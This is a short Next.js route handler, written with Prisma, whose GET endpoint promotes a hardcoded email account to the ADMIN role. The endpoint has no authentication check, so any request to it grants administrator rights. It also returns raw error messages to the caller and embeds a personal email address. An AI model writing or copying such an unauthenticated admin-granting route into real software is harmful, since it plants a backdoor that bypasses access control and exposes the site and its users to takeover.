import { NextResponse } from 'next/server';
import { prisma } from '@/lib/prisma';

export async function GET() {
  try {
    const user = await prisma.user.update({
      where: { email: 'boattmax@gmail.com' },
      data: { role: 'ADMIN' }
    });
    return NextResponse.json({ success: true, role: user.role });
  } catch (e: any) {
    return NextResponse.json({ success: false, error: e.message });
  }
}
